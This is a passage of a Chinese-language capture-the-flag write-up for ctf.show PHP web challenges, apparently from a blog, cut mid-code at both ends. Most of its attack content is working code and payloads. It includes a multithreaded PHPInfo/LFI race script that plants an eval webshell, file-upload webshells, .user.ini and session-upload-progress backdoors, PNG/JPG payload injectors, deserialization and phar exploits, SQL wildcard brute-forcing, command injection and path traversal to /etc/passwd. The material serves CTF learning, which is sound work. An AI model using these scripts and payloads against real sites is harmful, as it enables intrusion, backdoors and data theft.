&#123;padding&#125;\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: &#123;request_data_length&#125;\\rHost: &#123;host&#125;:&#123;port&#125;\\r\\r&#123;request_data&#125;&#x27;&#x27;&#x27;.format( padding=&#x27;A&#x27; * 4000, phpinfo_path=phpinfo_path, request_data_length=len(request_data), host=host, port=port, request_data=request_data ) lfi_request = \\&#x27;&#x27;&#x27;POST &#123;lfi_path&#125;?&#123;lfi_param&#125; HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: &#123;host&#125;\\rContent-Type: application/x-www-form-urlencoded\\r\\rctf=&#123;&#123;&#125;&#125;\\r&#x27;&#x27;&#x27;.format( lfi_path=lfi_path, lfi_param=lfi_param, host=host ) return phpinfo_request, tag, lfi_requestdef phpinfo_lfi(host, port, phpinfo_request, offset, lfi_request, tag): &quot;&quot;&quot; 通过向phpinfo发送大数据包延缓时间, 然后利用lfi执行 :param host:HOST :param port:端口 :param phpinfo_request: phpinfo页面请求内容 :param offset: tmp_name在phpinfo中的偏移位 :param lfi_request: lfi页面请求内容 :param tag: 标识内容 :return: tmp_file_name: 临时文件名 &quot;&quot;&quot; phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) lfi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) phpinfo_socket.connect((host, port)) lfi_socket.connect((host, port)) # 1. 先向phpinfo发送大数据包, 且其中包含php会将payload放入临时文件中 # print(phpinfo_request) # print(lfi_request) phpinfo_socket.send(phpinfo_request.encode()) phpinfo_response_data = &#x27;&#x27; while len(phpinfo_response_data) &lt; offset: # 取不到数据则反复执行 phpinfo_response_data += phpinfo_socket.recv(offset).decode() try: tmp_name_index = phpinfo_response_data.index(&#x27;[tmp_name] =&amp;gt&#x27;) # 获取包含payload的临时文件名 tmp_file_name = phpinfo_response_data[ tmp_name_index + 17: tmp_name_index + 31 ] except ValueError: return None # 2. 再向lfi发送包含payload的临时文件名, 用于包含 lfi_socket.send((lfi_request.format(tmp_file_name)).encode()) # print(lfi_request.format(tmp_file_name)) lfi_response_data = lfi_socket.recv(4096).decode() # 3. 停止phpinfo socket连接 phpinfo_socket.close() # 4. 停止lfi socket连接 lfi_socket.close() if lfi_response_data.find(tag) != -1: # 5. lfi response中存在标识内容则payload执行成功 return tmp_file_nameclass ThreadWorker(threading.Thread): def __init__(self, event, lock, max_attempts, host, port, phpinfo_request, offset, lfi_request, tag, shell_code, shell_path, lfi_path, lfi_param): threading.Thread.__init__(self) self.event = event self.lock = lock self.max_attempts = max_attempts self.host = host self.port = port self.phpinfo_request = phpinfo_request self.offset = offset self.lfi_request = lfi_request self.tag = tag self.shell_code = shell_code self.shell_path = shell_path self.lfi_path = lfi_path self.lfi_param = lfi_param def run(self): global attempts_counter while not self.event.is_set(): # 如果没有set event则一直重复执行, 直到已尝试次数大于最大尝试数(attempts_counter &gt; max_attempts) with self.lock: # 获取锁, 执行完后释放 if attempts_counter &gt;= self.max_attempts: return attempts_counter += 1 try: tmp_file_name = phpinfo_lfi( self.host, self.port, self.phpinfo_request, self.offset, self.lfi_request, self.tag) if self.event.is_set(): break if tmp_file_name: # 找到tmp_file_name后通过set event停止运行 print(&#x27;\\n&#123;shell_code&#125; 已经被写入到&#123;shell_path&#125;中&#x27;.format( shell_code=self.shell_code, shell_path=self.shell_path )) &#x27;http://127.0.0.1/test/lfi_phpinfo/lfi.php?load=/tmp/gc&amp;f=uname%20-a&#x27; print(&#x27;默认调用方法: http://&#123;host&#125;:&#123;port&#125;&#123;lfi_path&#125;?&#123;lfi_param&#125;=&#123;shell_path&#125;&amp;f=uname%20-a&#x27;.format( host=self.host, port=self.port, lfi_path=self.lfi_path, lfi_param=self.lfi_param, shell_path=self.shell_path )) self.event.set() except socket.error: returndef get_offset(host, port, phpinfo_request): &quot;&quot;&quot; 获取tmp_name在phpinfo中的偏移量 :param host: HOST :param port: 端口 :param phpinfo_request: phpinfo 请求内容 :return: tmp_name在phpinfo中的偏移量 &quot;&quot;&quot; phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) phpinfo_socket.connect((host, port)) phpinfo_socket.send(phpinfo_request.encode()) phpinfo_response_data = &#x27;&#x27; while True: i = phpinfo_socket.recv(4096).decode() phpinfo_response_data += i if i == &#x27;&#x27;: break # 检测是否是最后一个数据块 if i.endswith(&#x27;0\\r\\n\\r\\n&#x27;): break phpinfo_socket.close() tmp_name_index = phpinfo_response_data.find(&#x27;[tmp_name] =&amp;gt&#x27;) print(phpinfo_response_data) if tmp_name_index == -1: raise ValueError(&#x27;没有在phpinfo中找到tmp_name&#x27;) print(&#x27;找到了 &#123;&#125; 在phpinfo内容索引为&#123;&#125;的位置&#x27;.format( phpinfo_response_data[tmp_name_index:tmp_name_index+10], tmp_name_index)) return tmp_name_index + 256def main(): pool_size = 100 host = &#x27;9627f67a-6cd4-4434-82d0-24853f6204c8.chall.ctf.show&#x27; port = 80 phpinfo_path = &#x27;/&#x27; lfi_path = &#x27;/&#x27; lfi_param = &#x27;isVIP=1&#x27; shell_code = &#x27;&lt;?php eval($_POST[&quot;mb&quot;]);?&gt;&#x27; shell_path = &#x27;/tmp/g&#x27; # 最大尝试次数 max_attempts = 1000 print(&#x27;LFI With PHPInfo()&#x27;) # 一 生成phpinfo请求内容, 标志内容, lfi请求内容 phpinfo_request, tag, lfi_request = setup( host=host, port=port, phpinfo_path=phpinfo_path, lfi_path=lfi_path, lfi_param=lfi_param, shell_code=shell_code, shell_path=shell_path) # 二 获取[tmp_name]在phpinfo中的偏移位 offset = get_offset(host, port, phpinfo_request) sys.stdout.flush() thread_event = threading.Event() thread_lock = threading.Lock() print(&#x27;创建线程池 &#123;&#125;...&#x27;.format(pool_size)) sys.stdout.flush() thread_pool = [] for i in range(0, pool_size): # 三 多线程执行phpinfo_lfi thread_pool.append(ThreadWorker(thread_event, thread_lock, max_attempts, host, port, phpinfo_request, offset, lfi_request, tag, shell_code, shell_path, lfi_path, lfi_param )) for t in thread_pool: t.start() try: while not thread_event.wait(1): if thread_event.is_set(): break with thread_lock: sys.stdout.write(&#x27;\\r&#123;&#125; / &#123;&#125;&#x27;.format(attempts_counter, max_attempts)) sys.stdout.flush() if attempts_counter &gt;= max_attempts: # 尝试次数大于最大尝试次数则退出 break if thread_event.is_set(): print(&#x27;&#x27;&#x27;success !&#x27;&#x27;&#x27;) else: print(&#x27;LJBD!&#x27;) except KeyboardInterrupt: print(&#x27;\\n正在停止所有线程...&#x27;) thread_event.set() for t in thread_pool: t.join()if __name__ == &quot;__main__&quot;: main() 没打通 还是用上传进度吧 web151上传png后缀webshell bp抓包改成php后缀 web152上传png后缀webshell bp抓包改成php后缀 web153.user.ini绕过 访问upload目录 提示nothing is here 猜测是php文件 web154比上面加了个内容过滤 短标签绕过 1&lt;?=eval($_POST[&#x27;a&#x27;])?&gt; web155和上面一样 web156过滤了POST 直接system 1&lt;?&#x3D;system(&#39;cat ..&#x2F;*&#39;); web157过滤; 1&lt;?&#x3D;system(&#39;cat ..&#x2F;f*&#39;)?&gt; web158同上 web159()过滤了 1&lt;?&#x3D;&#96;cat ..&#x2F;*&#96;?&gt; web160过滤了空格 反引号 log 包含日志 1&lt;?&#x3D;include &#39;&#x2F;var&#x2F;lo&#39;.&#39;g&#x2F;nginx&#x2F;access.lo&#39;.&#39;g&#39;?&gt; 请求时UA换成shell就行 web161文件头检测 通过getimagesize函数检测 ss.png 12GIF89a&lt;?&#x3D;include &#39;&#x2F;var&#x2F;lo&#39;.&#39;g&#x2F;nginx&#x2F;access.lo&#39;.&#39;g&#39;?&gt; .user.ini 12GIF89aauto_prepend_file&#x3D;ss.png web162.也过滤了 包含session .user.ini 12GIF89aauto_prepend_file&#x3D;&#x2F;tmp&#x2F;sess_mb exp: 1234567891011121314151617181920import requestsimport threadingurl=&#x27;http://9627f67a-6cd4-4434-82d0-24853f6204c8.chall.ctf.show/&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=mb&#x27;&#125;def POST(): while True: files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27; #恶意进度信息，readfile将直接输出文件内容 &#125; r.post(url,files=files,headers=headers,data=data)for i in range(50): threading.Thread(target=POST,args=()).start() exp跑起来 bp竞争访问upload路径 成功之后再更改 .user.ini 12GIF89aauto_prepend_file&#x3D;&#x2F;tmp&#x2F;mb web163和上面一样 web164png二次渲染 使用国外大佬的脚本 12345678910111213141516171819202122&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;./1.png&#x27;);?&gt; 会生成一个$_GET[0]($_POST[1])的后门 web165jpg二次渲染 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 不容易成功 最好选用纯白的 这里可以使用：https://www.sqlsec.com/2020/10/upload.html#toc-heading-22 国光大佬tql web166zip协议绕过 payload: 1?file&#x3D;zip:&#x2F;&#x2F;f680e2131dd661dd322e8b0aa938ff56.zip%231.php web167jpg .htaccess绕过 web168png bp抓包改后缀php 1234&lt;?php $_&#x3D;~&quot;\\xA0\\xAF\\xB0\\xAC\\xAB&quot;;$__&#x3D;~&quot;\\x8C\\x86\\x8C\\x8B\\x9A\\x92&quot;;$__($$_[1]); web169可以上传php .user.ini包含日志 1auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log web170和上面一样 月饼杯web1_此夜圆源码： 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;yu22x&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 反序列化字符逃逸，由于是变长，因此必须添加&quot;把前面的闭合了，判断需添加的字符串： 1&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; 列方程： 12311n &#x3D; 9n+ 30 +k&#x2F;&#x2F; n&#x3D;15 k&#x3D;0 构造payload: 1?1&#x3D;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; web2_故人心源码： 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);highlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];$c=$_GET[&#x27;c&#x27;];$url[1]=$_POST[&#x27;url&#x27;];if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123; $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c))); if($d)&#123; highlight_file(&#x27;hint.php&#x27;); if(filter_var($url[1],FILTER_VALIDATE_URL))&#123; $host=parse_url($url[1]); print_r($host); if(preg_match(&#x27;/ctfshow\\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123; print_r(file_get_contents($url[1])); &#125;else&#123; echo &#x27;差点点就成功了！&#x27;; &#125; &#125;else&#123; echo &#x27;please give me url!!!&#x27;; &#125; &#125;else&#123; echo &#x27;想一想md5碰撞原理吧?!&#x27;; &#125;&#125;else&#123; echo &#x27;第一个都过不了还想要flag呀?!&#x27;;&#125; 第一关试就完事了，猜测是精度问题，后来才知道php小数点后超过161位做平方运算时会被截断，但是超过323位又会失效。用科学计数法来代替，即 1e-162 到 1e-323 1a&#x3D;1e-300 第二关md2弱比较，写脚本跑吧，robots里有提示 12xxxxx024452 hash(&quot;md2&quot;,$b)xxxxxx48399 hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b)) 脚本： 1234567891011121314151617from Crypto.Hash import MD2def md2(s): obj = MD2.new() obj.update(s.encode()) return obj.hexdigest()def check(id): # print(id) d =&#x27;0e&#x27;+str(id)+&#x27;48399&#x27; enc=md2(md2(d)) if enc[0:2]==&#x27;0e&#x27; and enc[2:-1].isdigit(): print(d) return 1 return 0for i in range(1000,9999): check(i) 跑出来 1b &#x3D; 0e652024452 c &#x3D; 0e603448399 最后一关，php会将不认识的协议当作目录，payload: 12?a&#x3D;1e-300&amp;b&#x3D;0e652024452&amp;c&#x3D;0e603448399POST: url&#x3D;a:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 需要跳5层 a一层 ctfshow.com一层 web3_莫负婵娟查看源码发现： 12&lt;!-- username yu22x --&gt;&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt; fuzz一下，发现过滤了： 1&#39; # \\ % 都过滤了，闭合sql语句注入应该不行了，再看下发现比较时是like，想到sql通配符 123%：用来表示任意多个字符，可以为0_ : 用来表示任意单个字符 发现当有32个_时状态改变了 我们可以写个脚本跑下密码 12345678910111213141516171819202122import requestsimport strings = string.ascii_lowercase + string.ascii_uppercase + string.digitsflag = &#x27;&#x27;url = &#x27;http://04c9162c-4824-4247-8d26-743472a723a6.chall.ctf.show/login.php&#x27;for i in range(1,100): f = flag for j in s: print(i,j) p = flag+j+(32-i)*&#x27;_&#x27; data = &#123;&#x27;username&#x27;:&#x27;yu22x&#x27;,&#x27;password&#x27;:p&#125; r = requests.post(url, data=data) if &#x27;wrong&#x27; not in r.text: flag+=j print(flag) break if flag== f: breakprint(flag)# 67815b0c009ee970fe4014abaa3Fa6A0 注意最后一位跑出来的时候会登录成功，状态不一样 登陆进去发现是个curl的功能，猜测是命令注入，fuzz一下 过滤了 1小写字母 | () &#x2F; \\ &#96; * , &lt; &gt; ! 但是 这些没过滤 1? $ &#123; &#125; : 大写字母没过滤，而一些linux的常量都是大写字母，如: 123$PATH linux环境变量$HOME 用户主目录$PWD 当前路径 可以直接带出这变量 1ip&#x3D;1.1.1.1:9000?$PATH 然后截取拼接就行 1ip&#x3D;127.0.0.1;$&#123;PATH:7:1&#125;$&#123;PATH:8:1&#125;$&#123;HOME:12:1&#125; ????.??? DJBveryphp源码： 123456789101112131415161718192021222324252627282930313233 &lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;config.php&quot;);class qwq&#123; function __wakeup()&#123; die(&quot;Access Denied!&quot;); &#125; static function oao()&#123; show_source(&quot;config.php&quot;); &#125;&#125;$str = file_get_contents(&quot;php://input&quot;);if(preg_match(&#x27;/\\`|\\_|\\.|%|\\*|\\~|\\^|\\&#x27;|\\&quot;|\\;|\\(|\\)|\\]|g|e|l|i|\\//is&#x27;,$str))&#123; die(&quot;I am sorry but you have to leave.&quot;);&#125;else&#123; extract($_POST);&#125;if(isset($shaw_root))&#123; if(preg_match(&#x27;/^\\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\\D*?(abc.*?)p(hp)*\\@R(s|r).$/&#x27;, $shaw_root)&amp;&amp; strlen($shaw_root)===29)&#123; echo $hint; &#125;else&#123; echo &quot;Almost there.&quot;.&quot;&lt;br&gt;&quot;; &#125;&#125;else&#123; echo &quot;&lt;br&gt;&quot;.&quot;Input correct parameters&quot;.&quot;&lt;br&gt;&quot;; die();&#125;if($ans===$SecretNumber)&#123; echo &quot;&lt;br&gt;&quot;.&quot;Congratulations!&quot;.&quot;&lt;br&gt;&quot;; call_user_func($my_ans);&#125; 变量覆盖 php字符串解析特性 注意最好用bp发包 hackbar会url编码 正则那就试就完事了 payload: 12POST： shaw+root&#x3D;-a9&lt;b&gt;a&gt;&gt;&gt;&gt;aabcaaaaaaaphp@Rsa&amp;ans&#x3D;21475&amp;my+ans&#x3D;qwq::oao md5使用hashcat一条命令 1hashcat64.exe -a 3 -m 0 166b47a5cb1ca2431a0edfcef200684f shaw?a?a?a?a?aroot spaceman123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class spaceman&#123; public $username; public $password; public function __construct($username,$password) &#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;ctfshowvip&#x27;) &#123; include(&quot;flag.php&quot;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125;&#125;function filter($string)&#123; return str_replace(&#x27;ctfshowup&#x27;,&#x27;ctfshow&#x27;,$string);&#125;$str = file_get_contents(&quot;php://input&quot;);if(preg_match(&#x27;/\\_|\\.|\\]|\\[/is&#x27;,$str))&#123; die(&quot;I am sorry but you have to leave.&quot;);&#125;else&#123; extract($_POST);&#125;$ser = filter(serialize(new spaceman($user_name,$pass_word)));$test = unserialize($ser); 没用字符逃逸😂： 12POST: user+name&#x3D;admin&amp;pass+word&#x3D;ctfshowvip 用字符逃逸payload: 12POST:user+name&#x3D;adminctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;pass+word&#x3D;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125; 虎山行安装的时候getshell 昵称填 1神秘人&#39;);eval($_POST[1]);?&gt; 访问： 1mc-files&#x2F;mc-conf.php 虎山行’s revengemc-admin/page-edit.php一处任意文件读取 读/flag 提示hsxhsxhsxctfshowsecretfilel目录 得到 12345678910111213 &lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#x27;waf.php&#x27;);class Ctfshow&#123; public $ctfer = &#x27;shower&#x27;; public function __destruct()&#123; system(&#x27;cp /hint* /var/www/html/hint.txt&#x27;); &#125;&#125;$filename = $_GET[&#x27;file&#x27;];readgzfile(waf($filename));?&gt; 读waf.php 12345678&lt;?phpfunction waf($file)&#123; if (preg_match(&quot;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\\.\\.\\//i&quot;,$file))&#123; die(&quot;姿势太简单啦，来一点骚的？！&quot;); &#125;else&#123; return $file; &#125;&#125; 明显phar反序列化 限制开头还有一些协议 使用zlib:phar:// 限制../使用绝对路径 登陆之后有个上传点 并且提示 跑一下就行 1filename&#x3D;substr(md5(time()),0,8) poc: 12345678910111213 &lt;?phpclass Ctfshow&#123; public $ctfer = &#x27;shower&#x27;;&#125;$phar = new Phar(&quot;aaa.phar&quot;); //后缀名必须为 phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$object = new Ctfshow;$phar-&gt;setMetadata($object); //将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); 改成gif后缀传上去 然后phar反序列化 读hint.txt 套娃 继续访问hsxctfshowsecretgetflagl目录 得到 1234567891011121314 &lt;?phpshow_source(__FILE__);$unser = $_GET[&#x27;unser&#x27;];class Unser &#123; public $username=&#x27;Firebasky&#x27;; public $password; function __destruct() &#123; if($this-&gt;username==&#x27;ctfshow&#x27;&amp;&amp;$this-&gt;password==(int)md5(time()))&#123; system(&#x27;cp /ctfshow* /var/www/html/flag.txt&#x27;); &#125; &#125;&#125;$ctf=@unserialize($unser);system(&#x27;rm -rf /var/www/html/flag.txt&#x27;); 继续反序列化 poc: 123456 &lt;?phpclass Unser &#123; public $username=&#x27;ctfshow&#x27;; public $password=0;&#125;echo serialize(new Unser); 接着竞争访问 flag.txt F5杯eazy-unserialize源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102 &lt;?phpinclude &quot;mysqlDb.class.php&quot;;class ctfshow&#123; public $method; public $args; public $cursor; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;getCursor(); &#125; function getCursor()&#123; global $DEBUG; if (!$this-&gt;cursor) $this-&gt;cursor = MySql::getInstance(); if ($DEBUG) &#123; $sql = &quot;DROP TABLE IF EXISTS USERINFO&quot;; $this-&gt;cursor-&gt;Exec($sql); $sql = &quot;CREATE TABLE IF NOT EXISTS USERINFO (username VARCHAR(64), password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8&quot;; $this-&gt;cursor-&gt;Exec($sql); $sql = &quot;INSERT INTO USERINFO VALUES (&#x27;CTFSHOW&#x27;, &#x27;CTFSHOW&#x27;, &#x27;admin&#x27;), (&#x27;HHD&#x27;, &#x27;HXD&#x27;, &#x27;user&#x27;)&quot;; $this-&gt;cursor-&gt;Exec($sql); &#125; &#125; function login() &#123; list($username, $password) = func_get_args(); $sql = sprintf(&quot;SELECT * FROM USERINFO WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;, $username, md5($password)); $obj = $this-&gt;cursor-&gt;getRow($sql); $data = $obj[&#x27;role&#x27;]; if ( $data != null ) &#123; define(&#x27;Happy&#x27;, TRUE); $this-&gt;loadData($data); &#125; else &#123; $this-&gt;byebye(&quot;sorry!&quot;); &#125; &#125; function closeCursor()&#123; $this-&gt;cursor = MySql::destroyInstance(); &#125; function lookme() &#123; highlight_file(__FILE__); &#125; function loadData($data) &#123; if (substr($data, 0, 2) !== &#x27;O:&#x27;) &#123; return unserialize($data); &#125; return null; &#125; function __destruct() &#123; $this-&gt;getCursor(); if (in_array($this-&gt;method, array(&quot;login&quot;, &quot;lookme&quot;))) &#123; @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; else &#123; $this-&gt;byebye(&quot;fuc***** hacker ?&quot;); &#125; $this-&gt;closeCursor(); &#125; function byebye($msg) &#123; $this-&gt;closeCursor(); header(&quot;Content-Type: application/json&quot;); die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) ); &#125;&#125;class Happy&#123; public $file=&#x27;flag.php&#x27;; function __destruct()&#123; if(!empty($this-&gt;file)) &#123; include $this-&gt;file; &#125; &#125;&#125;function ezwaf($data)&#123; if (preg_match(&quot;/ctfshow/&quot;,$data))&#123; die(&quot;Hacker !!!&quot;); &#125; return $data;&#125;if(isset($_GET[&quot;w_a_n&quot;])) &#123; @unserialize(ezwaf($_GET[&quot;w_a_n&quot;]));&#125; else &#123; new CTFSHOW(&quot;lookme&quot;, array());&#125; 直接包含/flag 预期解应该是 反序列化sql注入 flag.php 12345&lt;?php!defined(&#x27;Happy&#x27;) &amp;&amp; exit(&#x27;Access Denied&#x27;);echo file_get_contents(&quot;/flag&quot;);?&gt; ezwaf那里使用大写绕过 使用call_user_func_array调用login方法 在loadData函数里反序列化 使用数组绕过 poc: 1234567891011121314151617181920&lt;?phpclass Ctfshow&#123; public $method; public $args; public $cursor; function __construct() &#123; $this-&gt;method = &#x27;login&#x27;; $a = sprintf(&quot;aaa&#x27; union select 1,2,&#x27;%s&#x27;#&quot;,serialize([new Happy()])); $this-&gt;args = [$a,&#x27;aaa&#x27;]; &#125;&#125;class Happy&#123; public $file; function __construct()&#123; $this-&gt;file = &#x27;flag.php&#x27;; &#125;&#125;echo urlencode(serialize(new 